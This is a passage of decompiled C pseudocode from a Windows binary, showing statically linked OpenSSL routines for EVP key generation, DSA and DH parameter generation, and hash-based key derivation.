  else
  {
LABEL_14:
    sub_4CAE30((_BYTE **)v9);
    return 0;
  }
}

//----- (004CB160) --------------------------------------------------------
int __cdecl sub_4CB160(int *a1)
{
  int v1; // eax
  int (__cdecl *v2)(int *); // eax
  int result; // eax

  if ( a1 && (v1 = *a1) != 0 && *(_DWORD *)(v1 + 32) )
  {
    a1[4] = 4;
    v2 = *(int (__cdecl **)(int *))(v1 + 28);
    if ( v2 )
    {
      result = v2(a1);
      if ( result <= 0 )
        a1[4] = 0;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    sub_408310(6, 147, 150, (int)"crypto\\evp\\pmeth_gn.c", 73);
    return -2;
  }
  return result;
}

//----- (004CB1C0) --------------------------------------------------------
int __cdecl sub_4CB1C0(_DWORD *a1, volatile LONG **a2)
{
  volatile LONG *v3; // eax
  int v4; // edi

  if ( a1 && *a1 && *(_DWORD *)(*a1 + 32) )
  {
    if ( a1[4] == 4 )
    {
      if ( a2 && (*a2 || (v3 = sub_41CB00(), (*a2 = v3) != 0)) )
      {
        v4 = (*(int (__cdecl **)(_DWORD *, volatile LONG *))(*a1 + 32))(a1, *a2);
        if ( v4 <= 0 )
        {
          sub_41CEB0(*a2);
          *a2 = 0;
        }
        return v4;
      }
      else
      {
        return -1;
      }
    }
    else
    {
      sub_408310(6, 146, 151, (int)"crypto\\evp\\pmeth_gn.c", 95);
      return -1;
    }
  }
  else
  {
    sub_408310(6, 146, 150, (int)"crypto\\evp\\pmeth_gn.c", 91);
    return -2;
  }
}

//----- (004CB270) --------------------------------------------------------
int __cdecl sub_4CB270(int a1, int a2, int a3)
{
  int v3; // eax

  v3 = sub_422350(a3);
  **(_DWORD **)(v3 + 32) = a1;
  *(_DWORD *)(*(_DWORD *)(v3 + 32) + 4) = a2;
  return (*(int (__cdecl **)(int))(v3 + 28))(v3);
}

//----- (004CB2A0) --------------------------------------------------------
_DWORD *__cdecl sub_4CB2A0(_DWORD *a1, int a2)
{
  return sub_416F40(a1, (int)sub_4CB270, a2);
}

//----- (004CB2C0) --------------------------------------------------------
int *__cdecl sub_4CB2C0(int a1, volatile LONG *a2, int a3, int a4)
{
  int *result; // eax
  int *v5; // esi
  volatile LONG *v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  result = (int *)sub_443E40(a1, a2);
  v5 = result;
  if ( result )
  {
    if ( sub_4CB160(result) > 0 && sub_443A60((int)v5, -1, 4, 6, a4, a3) > 0 )
      sub_4CB1C0(v5, &v6);
    sub_443A10((volatile LONG **)v5);
    return (int *)v6;
  }
  return result;
}

//----- (004CB340) --------------------------------------------------------
int __usercall sub_4CB340@<eax>(
        __m64 a1@<mm0>,
        int a2,
        unsigned int a3,
        unsigned int a4,
        int *a5,
        void *Src,
        size_t Size,
        void *a8,
        int *a9,
        int *a10,
        _DWORD *a11)
{
  _DWORD *v11; // ebp
  int *v12; // ebx
  unsigned int v13; // esi
  unsigned int v15; // eax
  unsigned int v16; // eax
  _DWORD *v17; // edi
  int *v18; // eax
  void **v19; // eax
  int v20; // edi
  int i; // eax
  bool v23; // zf
  signed int v24; // eax
  int v25; // eax
  int v26; // ecx
  signed int v27; // ebp
  int v28; // edi
  int j; // eax
  void **v30; // eax
  int v31; // eax
  void **v32; // eax
  void **v33; // eax
  int v34; // ebp
  void **v35; // eax
  int **v36; // [esp+10h] [ebp-D4h]
  int *v37; // [esp+18h] [ebp-CCh]
  int *v38; // [esp+1Ch] [ebp-C8h]
  int v39; // [esp+20h] [ebp-C4h]
  unsigned int *v40; // [esp+24h] [ebp-C0h]
  _DWORD *v41; // [esp+28h] [ebp-BCh]
  int v42; // [esp+2Ch] [ebp-B8h]
  int v43; // [esp+30h] [ebp-B4h]
  int v44; // [esp+34h] [ebp-B0h]
  int *v45; // [esp+38h] [ebp-ACh]
  _DWORD *v46; // [esp+3Ch] [ebp-A8h]
  void *v47; // [esp+40h] [ebp-A4h]
  _DWORD *v48; // [esp+44h] [ebp-A0h]
  int *v49; // [esp+48h] [ebp-9Ch]
  _DWORD *v50; // [esp+50h] [ebp-94h]
  int v51; // [esp+5Ch] [ebp-88h]
  char v52[32]; // [esp+60h] [ebp-84h] BYREF
  char v53[32]; // [esp+80h] [ebp-64h] BYREF
  char v54[32]; // [esp+A0h] [ebp-44h] BYREF
  char v55[32]; // [esp+C0h] [ebp-24h] BYREF
  int v56; // [esp+ECh] [ebp+8h]

  v11 = a11;
  v12 = 0;
  v51 = a2;
  v13 = a4 >> 3;
  v38 = a5;
  v47 = Src;
  v42 = 0;
  v44 = 0;
  v43 = 2;
  if ( a4 >> 3 != 20 && v13 != 28 && v13 != 32 )
    return 0;
  if ( !a5 )
    v38 = (int *)sub_42BEA0();
  v15 = a3;
  if ( a3 < 0x200 )
    v15 = 512;
  v56 = (v15 + 63) >> 6 << 6;
  if ( Src )
  {
    v16 = Size;
    if ( Size < v13 )
      return 0;
    if ( Size > v13 )
      v16 = a4 >> 3;
    memcpy(v54, Src, v16);
  }
  v17 = sub_4289A0();
  v41 = v17;
  if ( v17 )
  {
    v18 = sub_420670();
    v12 = v18;
    if ( v18 )
    {
      sub_420700(v18);
      v36 = (int **)sub_420790(v12);
      v40 = sub_420790(v12);
      v46 = sub_420790(v12);
      v37 = sub_420790(v12);
      v50 = sub_420790(v12);
      v48 = sub_420790(v12);
      v49 = sub_420790(v12);
      v45 = sub_420790(v12);
      v19 = sub_416820();
      if ( sub_437C10(v45, v19, v56 - 1) )
      {
LABEL_17:
        do
        {
          v20 = v47 == 0;
          if ( !sub_4D0950(v11, 0, v44++) )
            break;
          if ( v47 )
          {
            v47 = 0;
          }
          else if ( sub_406FF0() <= 0 )
          {
            break;
          }
          memcpy(v53, v54, v13);
          memcpy(v55, v54, v13);
          for ( i = v13 - 1; i >= 0; --i )
          {
            v23 = v53[i]++ == -1;
            if ( !v23 )
              break;
          }
          if ( !sub_42BC10((int)v54, v13, (int)v52, 0, v38, 0) || !sub_42BC10((int)v53, v13, (int)v55, 0, v38, 0) )
            break;
          v24 = 0;
          if ( a4 >> 3 )
          {
            do
            {
              v52[v24] ^= v55[v24];
              ++v24;
            }
            while ( v24 < (int)v13 );
          }
          v52[0] |= 0x80u;
          v52[v13 - 1] |= 1u;
          if ( !sub_4174D0(v52, v13, (int)v37) )
            break;
          v25 = sub_4D0E70(a1, v37, 50, v12, v20, v11);
          if ( v25 > 0 )
          {
            if ( sub_4D0950(v11, 2, 0) && sub_4D0950(v11, 3, 0) )
            {
              v26 = 0;
              v39 = 0;
              v27 = (v56 - 1) / 0xA0u;
              while ( !v26 || sub_4D0950(a11, 0, v26) )
              {
                sub_417490(v46, 0);
                v28 = 0;
                if ( v27 >= 0 )
                {
                  do
                  {
                    for ( j = v13 - 1; j >= 0; --j )
                    {
                      v23 = v53[j]++ == -1;
                      if ( !v23 )
                        break;
                    }
                    if ( !sub_42BC10((int)v53, v13, (int)v52, 0, v38, 0)
                      || !sub_4174D0(v52, v13, (int)v36)
                      || !sub_437C10(v36, v36, v28 * 8 * v13)
                      || !sub_4220E0(v46, (int)v46, (int)v36) )
                    {
                      goto LABEL_81;
                    }
                  }
                  while ( ++v28 <= v27 );
                }
                if ( !sub_417320(v46, v56 - 1) )
                  goto LABEL_81;
                if ( !sub_4173E0(v50, v46) )
                  goto LABEL_81;
                if ( !sub_4220E0(v50, (int)v50, (int)v45) )
                  goto LABEL_81;
                if ( !sub_437AC0(v36, (int **)v37) )
                  goto LABEL_81;
                if ( !sub_4299A0(0, (int)v48, v50, (int *)v36, v12) )
                  goto LABEL_81;
                v30 = sub_416820();
                if ( !sub_422020(v36, (int)v48, (int)v30) || !sub_422020(v49, (int)v50, (int)v36) )
                  goto LABEL_81;
                if ( sub_4169B0(v49, v45) >= 0 )
                {
                  v31 = sub_4D0E70(a1, v49, 50, v12, 1, a11);
                  if ( v31 > 0 )
                  {
                    if ( sub_4D0950(a11, 2, 1) )
                    {
                      v32 = sub_416820();
                      if ( sub_422020(v45, (int)v49, (int)v32) )
                      {
                        if ( sub_4299A0(v36, 0, v45, v37, v12)
                          && sub_417490(v45, 2)
                          && sub_4285F0(v41, (int **)v49, v12)
                          && sub_427DE0(a1, v40, v45, v36, (int)v49, v12, v41) )
                        {
                          while ( sub_416DC0((int)v40) )
                          {
                            v33 = sub_416820();
                            if ( sub_4220E0(v45, (int)v45, (int)v33) )
                            {
                              ++v43;
                              if ( sub_427DE0(a1, v40, v45, v36, (int)v49, v12, v41) )
                                continue;
                            }
                            goto LABEL_81;
                          }
                          if ( sub_4D0950(a11, 3, 1) )
                          {
                            v34 = v51;
                            v42 = 1;
                            sub_417060(*(void ***)(v51 + 8));
                            sub_417060(*(void ***)(v34 + 12));
                            sub_417060(*(void ***)(v34 + 16));
                            *(_DWORD *)(v34 + 8) = sub_4176D0((int)v49);
                            *(_DWORD *)(v34 + 12) = sub_4176D0((int)v37);
                            v35 = sub_4176D0((int)v40);
                            v23 = *(_DWORD *)(v34 + 8) == 0;
                            *(_DWORD *)(v34 + 16) = v35;
                            if ( !v23 && *(_DWORD *)(v34 + 12) && v35 )
                            {
                              if ( a9 )
                                *a9 = v39;
                              if ( a10 )
                                *a10 = v43;
                              if ( a8 )
                                memcpy(a8, v54, v13);
                            }
                            else
                            {
                              v42 = 0;
                            }
                          }
                        }
                      }
                    }
                    goto LABEL_81;
                  }
                  if ( v31 )
                    goto LABEL_81;
                }
                if ( ++v39 >= 4096 )
                {
                  v11 = a11;
                  goto LABEL_17;
                }
                v26 = v39;
              }
            }
            break;
          }
        }
        while ( !v25 );
      }
LABEL_81:
      sub_420750(v12);
      v17 = v41;
    }
  }
  sub_4206C0((void **)v12);
  sub_4285A0(v17);
  return v42;
}
// 4CB340: using guessed type char var_64[32];
// 4CB340: using guessed type char var_24[32];
// 4CB340: using guessed type char var_84[32];

//----- (004CBA40) --------------------------------------------------------
int __usercall sub_4CBA40@<eax>(
        __m64 a1@<mm0>,
        int a2,
        int a3,
        unsigned int a4,
        int *a5,
        const void *a6,
        int Size,
        int a8,
        void *a9,
        int *a10,
        unsigned int *a11,
        _DWORD *a12)
{
  int v12; // edi
  int *v13; // eax
  int v14; // eax
  size_t v15; // ebp
  void *v16; // esi
  void *v17; // eax
  _DWORD *v18; // ebp
  int **v19; // esi
  void **v20; // eax
  int v21; // eax
  char *v22; // esi
  int v23; // eax
  int v24; // ecx
  signed int v25; // ebx
  signed int v26; // esi
  int v27; // edi
  int i; // eax
  bool v29; // zf
  void **v30; // eax
  int v31; // eax
  void **v32; // eax
  void **v33; // eax
  void **v34; // eax
  void **v35; // eax
  int *v37; // [esp+10h] [ebp-ACh]
  void *Block; // [esp+14h] [ebp-A8h]
  int *v39; // [esp+18h] [ebp-A4h]
  void *v40; // [esp+1Ch] [ebp-A0h]
  unsigned int v41; // [esp+20h] [ebp-9Ch]
  int *v42; // [esp+24h] [ebp-98h]
  int v43; // [esp+2Ch] [ebp-90h]
  int v44; // [esp+30h] [ebp-8Ch]
  int *v45; // [esp+34h] [ebp-88h]
  int v46; // [esp+38h] [ebp-84h]
  _DWORD *v47; // [esp+3Ch] [ebp-80h]
  _DWORD *v48; // [esp+40h] [ebp-7Ch]
  int v49; // [esp+44h] [ebp-78h]
  unsigned int *v50; // [esp+48h] [ebp-74h]
  _DWORD *v51; // [esp+4Ch] [ebp-70h]
  _BYTE **v52; // [esp+58h] [ebp-64h]
  _DWORD *v53; // [esp+5Ch] [ebp-60h]
  _DWORD *v54; // [esp+64h] [ebp-58h]
  int v55; // [esp+74h] [ebp-48h]
  char v56[64]; // [esp+78h] [ebp-44h] BYREF

  v39 = a5;
  v12 = a4 >> 3;
  v43 = -1;
  Block = 0;
  v40 = 0;
  v48 = 0;
  v49 = 0;
  v46 = 0;
  v37 = 0;
  v52 = (_BYTE **)sub_42B820();
  v41 = 2;
  if ( !v52 )
    goto LABEL_108;
  v13 = a5;
  if ( !a5 )
  {
    if ( a4 == 160 )
    {
      v13 = (int *)sub_42BEA0();
    }
    else if ( a4 == 224 )
    {
      v13 = (int *)sub_42BF40();
    }
    else
    {
      v13 = (int *)sub_42BF50();
    }
    v39 = v13;
  }
  v14 = sub_407480((int)v13);
  v44 = v14;
  if ( !*(_DWORD *)(a2 + 8) || !*(_DWORD *)(a2 + 12) || a8 >= 0 )
  {
    v15 = Size;
    if ( !Size )
    {
      v15 = v14;
      Size = v14;
    }
    v16 = sub_4133F0(v15);
    v17 = a9;
    Block = v16;
    if ( !a9 )
      v17 = sub_4133F0(v15);
    v40 = v17;
    if ( !v16 || !v17 )
      goto LABEL_108;
    if ( a6 )
      memcpy(v16, a6, v15);
  }
  v37 = sub_420670();
  if ( v37 )
  {
    v48 = sub_4289A0();
    if ( v48 )
    {
      sub_420700(v37);
      v18 = sub_420790(v37);
      v47 = v18;
      v50 = sub_420790(v37);
      v51 = sub_420790(v37);
      v54 = sub_420790(v37);
      v53 = sub_420790(v37);
      v45 = sub_420790(v37);
      if ( v45 )
      {
        if ( *(_DWORD *)(a2 + 8) && *(_DWORD *)(a2 + 12) )
        {
          v19 = *(int ***)(a2 + 8);
          v42 = *(int **)(a2 + 12);
          if ( a8 >= 0 )
            memcpy(v40, Block, Size);
LABEL_73:
          v32 = sub_416820();
          if ( sub_422020(v45, (int)v19, (int)v32) && sub_4299A0(v18, 0, v45, v42, v37) )
          {
            if ( a8 >= 0 )
            {
              v41 = 1;
            }
            else if ( !sub_417490(v45, 2) )
            {
              goto LABEL_108;
            }
            if ( sub_4285F0(v48, v19, v37) )
            {
              while ( 1 )
              {
                if ( a8 >= 0 )
                {
                  v56[0] = a8;
                  v56[1] = BYTE1(v41);
                  v56[2] = v41;
                  if ( !sub_42B860((int)v52, v39, 0)
                    || !sub_42BA10((int)v52)
                    || !sub_42BA10((int)v52)
                    || !sub_42BA10((int)v52)
                    || !sub_42BA20(v52, (int)v56, 0)
                    || !sub_4174D0(v56, v44, (int)v45) )
                  {
                    break;
                  }
                }
                if ( !sub_427DE0(a1, v50, v45, v18, (int)v19, v37, v48) )
                  break;
                if ( !sub_416DC0((int)v50) )
                {
                  if ( sub_4D0950(a12, 3, 1) )
                  {
                    v34 = *(void ***)(a2 + 8);
                    v43 = 1;
                    if ( v19 != (int **)v34 )
                    {
                      sub_417060(v34);
                      *(_DWORD *)(a2 + 8) = sub_4176D0((int)v19);
                    }
                    if ( v42 != *(int **)(a2 + 12) )
                    {
                      sub_417060(*(void ***)(a2 + 12));
                      *(_DWORD *)(a2 + 12) = sub_4176D0((int)v42);
                    }
                    sub_417060(*(void ***)(a2 + 16));
                    v35 = sub_4176D0((int)v50);
                    v29 = *(_DWORD *)(a2 + 8) == 0;
                    *(_DWORD *)(a2 + 16) = v35;
                    if ( !v29 && *(_DWORD *)(a2 + 12) && v35 )
                    {
                      if ( a10 )
                        *a10 = v46;
                      if ( a11 )
                        *a11 = v41;
                    }
                    else
                    {
                      v43 = -1;
                    }
                  }
                  break;
                }
                if ( a8 >= 0 || (v33 = sub_416820(), sub_4220E0(v45, (int)v45, (int)v33)) )
                {
                  ++v41;
                  if ( a8 < 0 || v41 <= 0xFFFF )
                    continue;
                }
                break;
              }
            }
          }
        }
        else
        {
          v55 = (int)sub_420790(v37);
          v42 = sub_420790(v37);
          v20 = sub_416820();
          if ( sub_437C10(v45, v20, a3 - 1) )
          {
LABEL_28:
            while ( 1 )
            {
              v21 = sub_4D0950(a12, 0, v49++);
              if ( !v21 || !a6 && sub_406FF0() <= 0 )
                break;
              if ( !sub_42BC10((int)Block, Size, (int)v56, 0, v39, 0) )
                break;
              if ( v44 <= v12 )
                v22 = v56;
              else
                v22 = &v56[v44 - v12];
              if ( v44 < v12 )
                memset(&v56[v44], 0, v12 - v44);
              *v22 |= 0x80u;
              v22[v12 - 1] |= 1u;
              if ( !sub_4174D0(v22, v12, (int)v42) )
                break;
              v23 = sub_4D0E70(a1, v42, 50, v37, a6 != 0, a12);
              if ( v23 > 0 )
              {
                if ( a9 )
                  memcpy(a9, Block, Size);
                if ( sub_4D0950(a12, 2, 0) && sub_4D0950(a12, 3, 0) )
                {
                  v24 = 0;
                  v46 = 0;
                  v25 = (a3 - 1) / (unsigned int)(8 * v44);
                  while ( !v24 || sub_4D0950(a12, 0, v24) )
                  {
                    sub_417490(v51, 0);
                    v26 = 0;
                    if ( v25 >= 0 )
                    {
                      v27 = 0;
                      do
                      {
                        for ( i = Size - 1; i >= 0; --i )
                        {
                          v29 = (*((_BYTE *)Block + i))++ == 0xFF;
                          if ( !v29 )
                            break;
                        }
                        if ( !sub_42BC10((int)Block, Size, (int)v56, 0, v39, 0)
                          || !sub_4174D0(v56, v44, (int)v47)
                          || !sub_437C10(v47, v47, v27)
                          || !sub_4220E0(v51, (int)v51, (int)v47) )
                        {
                          goto LABEL_108;
                        }
                        ++v26;
                        v27 += 8 * v44;
                      }
                      while ( v26 <= v25 );
                    }
                    if ( !sub_417320(v51, a3 - 1) )
                      goto LABEL_108;
                    if ( !sub_4173E0(v54, v51) )
                      goto LABEL_108;
                    if ( !sub_4220E0(v54, (int)v54, (int)v45) )
                      goto LABEL_108;
                    v18 = v47;
                    if ( !sub_437AC0((int **)v47, (int **)v42) )
                      goto LABEL_108;
                    if ( !sub_4299A0(0, (int)v53, v54, v47, v37) )
                      goto LABEL_108;
                    v30 = sub_416820();
                    if ( !sub_422020(v47, (int)v53, (int)v30) )
                      goto LABEL_108;
                    v19 = (int **)v55;
                    if ( !sub_422020((_DWORD *)v55, (int)v54, (int)v47) )
                      goto LABEL_108;
                    if ( sub_4169B0(v19, v45) >= 0 )
                    {
                      v31 = sub_4D0E70(a1, (int *)v19, 50, v37, 1, a12);
                      if ( v31 > 0 )
                      {
                        if ( !sub_4D0950(a12, 2, 1) )
                          goto LABEL_108;
                        goto LABEL_73;
                      }
                      if ( v31 )
                        goto LABEL_108;
                    }
                    v24 = ++v46;
                    if ( v46 >= 4 * a3 )
                    {
                      if ( !a6 )
                      {
                        v12 = a4 >> 3;
                        goto LABEL_28;
                      }
                      v43 = 0;
                      sub_408310(10, 126, 112, (int)"crypto\\dsa\\dsa_gen.c", 506);
                      goto LABEL_108;
                    }
                  }
                }
                break;
              }
              if ( v23 )
                break;
              if ( a6 )
              {
                v43 = 0;
                sub_408310(10, 126, 113, (int)"crypto\\dsa\\dsa_gen.c", 417);
                break;
              }
            }
          }
        }
      }
    }
  }
LABEL_108:
  sub_413490(Block);
  if ( a9 != v40 )
    sub_413490(v40);
  if ( v37 )
    sub_420750(v37);
  sub_4206C0((void **)v37);
  sub_4285A0(v48);
  sub_42B840(v52);
  return v43;
}

//----- (004CC360) --------------------------------------------------------
int __usercall sub_4CC360@<eax>(__m64 a1@<mm0>, int a2, int a3, int a4, _DWORD *a5)
{
  int *v5; // eax
  int *v6; // esi
  int *v7; // ebp
  int *v8; // eax
  int *v9; // edi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int v12; // edi

  v5 = sub_420670();
  v6 = v5;
  if ( !v5 )
    goto LABEL_10;
  sub_420700(v5);
  v7 = sub_420790(v6);
  v8 = sub_420790(v6);
  v9 = v8;
  if ( !v7 )
    goto LABEL_10;
  if ( !v8 )
    goto LABEL_10;
  if ( !*(_DWORD *)(a2 + 8) )
  {
    v10 = sub_4168C0();
    *(_DWORD *)(a2 + 8) = v10;
    if ( !v10 )
      goto LABEL_10;
  }
  if ( !*(_DWORD *)(a2 + 12) )
  {
    v11 = sub_4168C0();
    *(_DWORD *)(a2 + 12) = v11;
    if ( !v11 )
      goto LABEL_10;
  }
  if ( a4 <= 1 )
  {
    sub_408310(5, 106, 101, (int)"crypto\\dh\\dh_gen.c", 81);
    goto LABEL_10;
  }
  if ( a4 == 2 )
  {
    if ( !sub_417490(v7, 24) || !sub_417490(v9, 11) )
      goto LABEL_10;
  }
  else if ( a4 == 5 )
  {
    if ( !sub_417490(v7, 10) || !sub_417490(v9, 3) )
      goto LABEL_10;
  }
  else if ( !sub_417490(v7, 2) || !sub_417490(v9, 1) )
  {
    goto LABEL_10;
  }
  if ( !sub_4D1260(a1, *(int ***)(a2 + 8), a3, 1, v7, v9, a5)
    || !sub_4D0950(a5, 3, 0)
    || !sub_417490(*(_DWORD **)(a2 + 12), a4) )
  {
LABEL_10:
    sub_408310(5, 106, 3, (int)"crypto\\dh\\dh_gen.c", 121);
    v12 = 0;
    goto LABEL_11;
  }
  v12 = 1;
LABEL_11:
  if ( v6 )
  {
    sub_420750(v6);
    sub_4206C0((void **)v6);
  }
  return v12;
}

//----- (004CC4E0) --------------------------------------------------------
int __usercall sub_4CC4E0@<eax>(__m64 a1@<mm0>, int a2, int a3, int a4, _DWORD *a5)
{
  int (*v5)(void); // eax

  v5 = *(int (**)(void))(*(_DWORD *)(a2 + 64) + 32);
  if ( v5 )
    return v5();
  else
    return sub_4CC360(a1, a2, a3, a4, a5);
}

//----- (004CC500) --------------------------------------------------------
int sub_4CC500()
{
  int v0; // esi
  void **v1; // eax
  bool v2; // zf

  v0 = sub_4349A0();
  if ( v0 )
  {
    *(_DWORD *)(v0 + 8) = sub_4176D0((int)&off_52D340);
    *(_DWORD *)(v0 + 12) = sub_4176D0((int)&off_52D354);
    v1 = sub_4176D0((int)&off_52D368);
    v2 = *(_DWORD *)(v0 + 8) == 0;
    *(_DWORD *)(v0 + 36) = v1;
    if ( !v2 && v1 && *(_DWORD *)(v0 + 12) )
      return v0;
    sub_4346C0((volatile LONG *)v0);
  }
  return 0;
}
// 52D340: using guessed type void *off_52D340;
// 52D354: using guessed type void *off_52D354;
// 52D368: using guessed type void *off_52D368;

//----- (004CC560) --------------------------------------------------------
int sub_4CC560()
{
  int v0; // esi
  void **v1; // eax
  bool v2; // zf

  v0 = sub_4349A0();
  if ( v0 )
  {
    *(_DWORD *)(v0 + 8) = sub_4176D0((int)&off_52D37C);
    *(_DWORD *)(v0 + 12) = sub_4176D0((int)&off_52D390);
    v1 = sub_4176D0((int)&off_52D3A4);
    v2 = *(_DWORD *)(v0 + 8) == 0;
    *(_DWORD *)(v0 + 36) = v1;
    if ( !v2 && v1 && *(_DWORD *)(v0 + 12) )
      return v0;
    sub_4346C0((volatile LONG *)v0);
  }
  return 0;
}
// 52D37C: using guessed type void *off_52D37C;
// 52D390: using guessed type void *off_52D390;
// 52D3A4: using guessed type void *off_52D3A4;

//----- (004CC5C0) --------------------------------------------------------
int sub_4CC5C0()
{
  int v0; // esi
  void **v1; // eax
  bool v2; // zf

  v0 = sub_4349A0();
  if ( v0 )
  {
    *(_DWORD *)(v0 + 8) = sub_4176D0((int)&off_52D3B8);
    *(_DWORD *)(v0 + 12) = sub_4176D0((int)&off_52D3CC);
    v1 = sub_4176D0((int)&off_52D3E0);
    v2 = *(_DWORD *)(v0 + 8) == 0;
    *(_DWORD *)(v0 + 36) = v1;
    if ( !v2 && v1 && *(_DWORD *)(v0 + 12) )
      return v0;
    sub_4346C0((volatile LONG *)v0);
  }
  return 0;
}
// 52D3B8: using guessed type void *off_52D3B8;
// 52D3CC: using guessed type void *off_52D3CC;
// 52D3E0: using guessed type void *off_52D3E0;

//----- (004CC620) --------------------------------------------------------
int __usercall sub_4CC620@<eax>(_BYTE **a1@<edi>, int *a2@<esi>, int a3)
{
  _BYTE *v3; // eax
  int v5; // [esp-4h] [ebp-14h]
  _BYTE *v6; // [esp+0h] [ebp-10h] BYREF
  int v7; // [esp+4h] [ebp-Ch] BYREF
  int v8; // [esp+8h] [ebp-8h] BYREF
  unsigned int v9; // [esp+Ch] [ebp-4h] BYREF

  v5 = *a2;
  v6 = *a1;
  if ( (sub_432B70(&v6, &v9, &v7, &v8, v5) & 0x80u) != 0 || v7 != a3 || v8 )
    return 0;
  v3 = v6;
  if ( v7 == 6 )
    v3 = &v6[v9];
  *a2 += *a1 - v3;
  *a1 = v3;
  return 1;
}

//----- (004CC690) --------------------------------------------------------
signed int __fastcall sub_4CC690(unsigned int a1, unsigned int a2, void **a3, char **a4, int a5, int a6)
{
  int *v6; // eax
  signed int v7; // eax
  signed int v8; // ebx
  char *v9; // esi
  char *v11; // [esp+4h] [ebp-38h] BYREF
  int v12; // [esp+8h] [ebp-34h] BYREF
  int v13[2]; // [esp+Ch] [ebp-30h] BYREF
  int v14[2]; // [esp+14h] [ebp-28h] BYREF
  int v15[4]; // [esp+1Ch] [ebp-20h] BYREF
  int v16[4]; // [esp+2Ch] [ebp-10h] BYREF

  if ( a1 > 0x40000000 || a2 > 0x40000000 )
    return 0;
  v13[1] = (int)v15;
  v14[0] = a5;
  v15[2] = (int)byte_5356D4;
  v15[0] = 4;
  v15[3] = 0;
  v15[1] = 4;
  v13[0] = 4;
  v14[1] = (int)v13;
  if ( a6 )
  {
    v16[2] = a6;
    v16[1] = 4;
    v16[3] = 0;
    v16[0] = a1;
    v6 = v16;
  }
  else
  {
    v6 = 0;
  }
  v7 = sub_479AA0(a3, (int)v14, (int)v6, a2);
  v8 = v7;
  if ( v7 <= 0 )
    return 0;
  v11 = (char *)*a3;
  v12 = v7;
  if ( !sub_4CC620(&v11, &v12, 16) )
    return 0;
  if ( !sub_4CC620(&v11, &v12, 16) )
    return 0;
  if ( !sub_4CC620(&v11, &v12, 6) )
    return 0;
  if ( !sub_4CC620(&v11, &v12, 4) )
    return 0;
  v9 = v11;
  if ( sub_413A50(v11, byte_5356D4, 4) )
    return 0;
  *a4 = v9;
  return v8;
}
// 5356D4: using guessed type _BYTE byte_5356D4[4];

//----- (004CC7B0) --------------------------------------------------------
int __cdecl sub_4CC7B0(char *a1, size_t Size, int a3, unsigned int a4, int a5, char *a6, int a7, int *a8)
{
  _BYTE **v9; // esi
  unsigned int v10; // ebp
  int i; // ebx
  char *v12; // eax
  char *v14; // [esp+10h] [ebp-58h] BYREF
  void *Block; // [esp+14h] [ebp-54h] BYREF
  int v16; // [esp+18h] [ebp-50h]
  int v17; // [esp+1Ch] [ebp-4Ch]
  char Src[64]; // [esp+24h] [ebp-44h] BYREF

  v17 = a3;
  v14 = a6;
  v16 = 0;
  Block = 0;
  if ( a4 > 0x40000000 )
    return 0;
  v9 = (_BYTE **)sub_42B820();
  if ( !v9 )
    return 0;
  v10 = sub_407480((int)a8);
  if ( sub_4CC690(a7, Size, &Block, &v14, a5, (int)v14) )
  {
    for ( i = 1; sub_42B860((int)v9, a8, 0); ++i )
    {
      if ( !sub_42BA10((int)v9) )
        break;
      v12 = v14;
      v14[3] = i;
      v12[2] = BYTE1(i);
      v12[1] = BYTE2(i);
      *v12 = HIBYTE(i);
      if ( !sub_42BA10((int)v9) )
        break;
      if ( Size < v10 )
      {
        if ( !sub_42BCA0(v9, (int)Src, 0) )
          break;
        memcpy(a1, Src, Size);
        sub_4139E0(Src, v10);
LABEL_16:
        v16 = 1;
        break;
      }
      if ( !sub_42BCA0(v9, (int)a1, 0) )
        break;
      Size -= v10;
      if ( !Size )
        goto LABEL_16;
      a1 += v10;
    }
  }
  sub_413490(Block);
  sub_42B840(v9);
  return v16;
}

//----- (004CC990) --------------------------------------------------------
_BYTE **__cdecl sub_4CC990(char *a1, size_t Size, int a3, unsigned int a4, int a5, unsigned int a6, int *a7)
{
  _BYTE **result; // eax
  _BYTE **v8; // esi
  unsigned int v9; // edi
  int v10; // ebx
  int v12; // [esp+Ch] [ebp-50h]
  char Src[64]; // [esp+18h] [ebp-44h] BYREF

  v12 = 0;
  if ( a6 > 0x40000000 || Size > 0x40000000 || a4 > 0x40000000 )
    return 0;
  result = (_BYTE **)sub_42B820();
  v8 = result;
  if ( result )
  {
    v9 = sub_407480((int)a7);
    v10 = 1;
    if ( sub_42B860((int)v8, a7, 0) )
    {
      while ( sub_42BA10((int)v8) && sub_42BA10((int)v8) && sub_42BA10((int)v8) )
      {
        if ( Size < v9 )
        {
          if ( !sub_42BCA0(v8, (int)Src, 0) )
            break;
          memcpy(a1, Src, Size);
          sub_4139E0(Src, v9);
LABEL_16:
          v12 = 1;
          break;
        }
        if ( !sub_42BCA0(v8, (int)a1, 0) )
          break;
        Size -= v9;
        if ( !Size )
          goto LABEL_16;
        a1 += v9;
        ++v10;
        if ( !sub_42B860((int)v8, a7, 0) )
          break;
      }
    }
    sub_42B840(v8);
    return (_BYTE **)v12;
  }
  return result;
}

//----- (004CCB70) --------------------------------------------------------
int __usercall sub_4CCB70@<eax>(int a1@<esi>, __m64 a2@<mm0>)
{
  int *v2; // ebp
  void **v3; // edi
  void **v4; // eax
  void **v5; // ebx
  int *Block; // [esp+8h] [ebp-8h]
  int v8; // [esp+Ch] [ebp-4h]

  v8 = 0;
  v2 = 0;
  v3 = 0;
  Block = sub_420670();
  if ( Block )
  {
    v3 = *(void ***)(a1 + 24);
    if ( v3 || (v3 = (void **)sub_416900()) != 0 )
    {
      while ( sub_42A970(v3, *(_DWORD **)(a1 + 12)) )
      {
        if ( !sub_416DB0((int)v3) )
        {
          v2 = *(int **)(a1 + 20);
          if ( v2 || (v2 = sub_4168C0()) != 0 )
          {
            v4 = (void **)sub_4168C0();
            v5 = v4;
            if ( v4 )
            {
              sub_416E80(v4, v3, 4);
              if ( sub_4282A0(a2, v2, *(int **)(a1 + 16), v5, *(int **)(a1 + 8), Block) )
              {
                sub_417060(v5);
                *(_DWORD *)(a1 + 24) = v3;
                *(_DWORD *)(a1 + 20) = v2;
                v8 = 1;
              }
              else
              {
                sub_417060(v5);
              }
            }
          }
          break;
        }
      }
    }
  }
  if ( v2 != *(int **)(a1 + 20) )
    sub_417060((void **)v2);
  if ( v3 != *(void ***)(a1 + 24) )
    sub_417060(v3);
  sub_4206C0((void **)Block);
  return v8;
}

//----- (004CCC70) --------------------------------------------------------
int __usercall sub_4CCC70@<eax>(__m64 a1@<mm0>, int a2)
{
  int (__cdecl *v2)(int); // eax

